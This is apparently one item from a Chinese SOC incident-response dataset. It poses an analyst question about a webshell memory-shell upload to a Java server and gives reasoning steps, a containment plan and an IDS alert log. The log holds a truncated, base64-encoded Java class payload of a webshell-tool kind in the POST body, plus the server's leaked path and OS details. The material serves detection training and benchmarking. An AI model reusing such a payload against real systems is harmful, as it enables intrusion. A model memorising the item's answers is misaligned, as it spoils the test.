@@ -1,0 +1,121 @@
+- ID: bt-003
+  Category: 后门木马
+  Created_At: 2025-04-29
+  Contributors: 
+    - FOOL
+  Additional_Info: |
+    - 额外的补充信息放到这里
+  Title_CN: 后门木马-webshell-上传内存马通信
+  Title_EN: backdoor-webshell_upload_memory_shell
+  Question: |
+    请以SOC团队的指挥官身份，评估并决策以下安全事件：
+    - 背景信息：攻击者通过POST请求，试图上传并执行一个名为 `shell4.jsp` 的恶意Webshell。该请求包含了大量的恶意负载，并且响应状态为200，表明请求成功。
+    - 背景信息：该请求来源于 `110.10.19.119`，目标是 `172.19.12.6`，涉及到的协议为HTTP，且请求中包含了与内存马相关的流量。
+    - 事件信息
+      - 系统: Web应用（Java）
+      - 攻击类型: Webshell探测
+      - 来源IP: '110.10.19.119'
+      - 目标IP: '172.19.12.6'
+      - 请求方式: 'POST'
+      - 请求路径: '/shell4.jsp'
+      - 响应状态: '200'
+
+Complex_CoT: |
+    1. 确认目标Web应用是否存在上传漏洞，特别是针对文件上传的安全性评估。
+    2. 分析请求中包含的恶意代码，确认是否有Webshell被成功上传并执行。
+    3. 检查目标服务器的访问日志，排查是否有其他异常请求或重复访问行为。
+    4. 评估攻击者是否通过该漏洞获得了敏感数据或执行了其他恶意操作。
+    5. 检查服务器上是否有异常的进程或服务在运行，确认是否存在后门或持久化机制。
+    6. 复查是否存在任何敏感数据被访问或导出的记录，评估潜在信息泄露风险。
+
+Response: |
+    1. 立即隔离受影响的Web服务器（172.19.12.6），中断外部访问流量。
+    2. 审核该Web应用的文件上传功能，全面修复上传漏洞，更新到安全版本。
+    3. 分析响应内容及请求参数，确认是否有恶意代码被执行，必要时进行取证。
+    4. 回溯分析攻击时间点前后的日志，识别是否存在持久化机制或横向行为。
+    5. 利用威胁情报封禁110.10.19.119来源IP，检查是否命中已知攻击者活动轨迹。
+    6. 重新部署WAF与IDS策略，对疑似Webshell攻击路径增加高优先级告警。
+    7. 建议对全网Web应用资产开展基线扫描和统一补丁加固，防止类似攻击再次发生。
+
+
+	Log Sample: |
+```
+{
+"sendHostAddress": "10.9.45.124",
+"transProtocol": "TCP",
+"appProtocol": "http",
+"srcAddress": "110.10.19.119",
+"srcPort": "20033",
+"srcMacAddress": "8C-94-6A-79-80-99",
+"destMacAddress": "00-00-5E-00-01-02",
+"destAddress": "172.19.12.6",
+"destPort": "5678",
+"deviceAddress": "10.9.45.124",
+"eventCount": "1",
+"srcGeoCountry": "中国",
+"srcGeoLongitude": "116.401159",
+"srcGeoLatitude": "39.902798",
+"destGeoCountry": "中国",
+"destGeoRegion": "上海",
+"destGeoCity": "上海",
+"direction": "10",
+"attackerAddress": "srcAddress",
+"victimAddress": "destAddress",
+"attackDirection": "1",
+"attacker": ["110.10.19.119"],
+"victim": ["172.19.12.6"],
+"srcSecurityZone": "outer",
+"logType": "alert",
+"dataType": "ids",
+"dataSubType": "attackAlert",
+"catOutcome": "OK",
+"catTechnique": "/Code/ShellCommand",
+"severity": "7",
+"startTime": "2025-04-08 22:15:15",
+"endTime": "2025-04-08 22:15:15",
+"deviceReceiptTime": "2025-04-08 22:15:15",
+"collectorReceiptTime": "2025-04-08 22:15:15",
+"ruleName": "检测到利用黑客工具上传内存马通信",
+"ruleType": "/WebAttack/WebshellRequest",
+"alarmType": "WEB 后门访问 ->WEBSHELL 探测",
+"requestMethod": "POST",
+"requestUrlQuery": "/shell4.jsp",
+"requestUrl": "/shell4.jsp",
+"requestHeader": "POST /shell4.jsp HTTP/1.1
+Host: 211.136.166.51:5678
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27
+Content-Length: 6301
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Cookie: Line-Id=c8c66cf0bc4718a645b0e698d13f056f700a774eb7dda16ab2dd36364ee89dbbc6727dcbfd75536340844c013f2a2bbdf171c8a8ca079528dea515cd11e46aba
+Accept-Encoding: gzip
+",
+"requestBody": "qSjvpaYH=yv66vgAAADEBCQoAOQB4CQBbAHkJAFsAeggAewkAWwB8CAB9CQBbAH4IAH8JAFsAgAoAWwCBBwCCCgALAHgIAIMIAIQIAIUIAIYLADMAhwsAMgCICwAzAIgLADIAiQoAWwCKCQBbAIsKAFsAjAoACwCNBwCOBwCPCgAaAHgIAJAKABoAkQoAGQCSCgAaAJILADMAkwoACwCSCgBbAJQKAJUAlggAlwoAmACZCACaCACbCgBbAJwIAJ0IAJ4KAEkAnwoAoAChCgCgAJIKABoAogoAOQCjCgA3AKQHAKUHAKYHAKcIAKgKADcAqQgAqgcAqwoANwCsBwCtCgCuAK8IALAIAFwKADcAsQoAsgCzCgCyALQIAF4KAFsAtQcAtggAtwcAuAkAuQC6CgCuALMKADcAuwoAuQC8BwC9CgA3AL4KAL8AwAoAOQCSCgC5AMEKAEkAwgoASQDDCgBJAMQIAMUIAMYKAEkAxwgAyAgAyQoANwDKCAByCADLCADMCgA3AM0HAM4BAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHZW5jb2RlcgEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAmNzAQAMcmFuZG9tUHJlZml4AQAQZGVjb2RlckNsYXNzZGF0YQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAtTeXNJbmZvQ29kZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAPV3d3Um9vdFBhdGhDb2RlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAhwYXJzZU9iagEAFShMamF2YS9sYW5nL09iamVjdDspVgEACGFzb3V0cHV0AQAGZGVjb2RlAQAKRXhjZXB0aW9ucwEAEkJhc2U2NERlY29kZVRvQnl0ZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAApTb3VyY2VGaWxlAQAJSW5mby5qYXZhDABlAGYMAFwAXQwAXgBfAQAGYmFzZTY0DABgAGEBAARVVEY4DABiAGEBAAEyDABjAGEMAG8AcAEAFmphdmEvbGFuZy9TdHJpbmdCdWZmZXIBAAc3ZjBhMzAyAQAMMjY3NDY3Mzc5NzczAQAOeGQ0MDVjYzU0MmRhZDMBAAl0ZXh0L2h0bWwMAM8A0AwA0QDQDADSAG4MAHIAbgwAZABhDABrAGwMANMA1AEAE2phdmEvbGFuZy9FeGNlcHRpb24BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACUVSUk9SOi8vIAwA0wDVDADWAGwMANcA2AwAcQBuBwDZDADaANABAAh1c2VyLmRpcgcA2wwA3ABuAQAHb3MubmFtZQEACXVzZXIubmFtZQwAbQBuAQABCQEAAS8MAN0A3gcA3wwA4ADhDADTAOIMAOMA5AwA5QDmAQATW0xqYXZhL2xhbmcvT2JqZWN0OwEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAHWphdmF4LnNlcnZsZXQuanNwLlBhZ2VDb250ZXh0DADnAOgBAApnZXRSZXF1ZXN0AQAPamF2YS9sYW5nL0NsYXNzDADpAOoBABBqYXZhL2xhbmcvT2JqZWN0BwDrDADsAO0BAAtnZXRSZXNwb25zZQwA7gDvBwDwDADxAPIMAPMA9AwAdAB1AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQALZGVmaW5lQ2x",
+"responseHeader": "HTTP/1.1 200 OK
+Content-Length: 73
+Content-Type: text/html;charset=UTF8
+Date: Mon, 09 Aug 2021 03:49:59 GMT
+Set-Cookie: Line-Id=c8c66cf0bc4718a645b0e698d13f056f700a774eb7dda16ab2dd36364ee89dbbc6727dcbfd75536340844c013f2a2bbdf171c8a8ca079528dea515cd11e46aba; Path=/; Max-Age=10; HttpOnly
+Set-Cookie: JSESSIONID=6BC5DC60209B12F8E22AA61C5C2A0F7E; Path=/; HttpOnly
+Connection: close
+",
+"responseMsg": "7f0a302/home/fairy/apache-tomcat-8.5.69/bin\x09/\x09Linux\x09fairy267467379773
+",
+"responseCode": "200",
+"destHostName": "211.136.166.51:5678",
+"name": "检测到利用黑客工具上传内存马通信",
+"txId": "0",
+"confidence": "High",
+"httpVersion": "HTTP/1.1",
+"accessAgent": "Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
+"attackStage": "3",
+"attackStatus": "1",
+"pcapRecord": "true",
+"tacticId": "TA0003",
+"techniquesId": "T1505",
+"subTechniquesId": "T1505.003",
+"message": "检测到利用黑客工具上传内存马通信。来源：110.10.19.119/20033, 目的：172.19.12.6/5678",
+"isAPT": "false",
+"killChain": "KC_CommandControl"
+}
+```
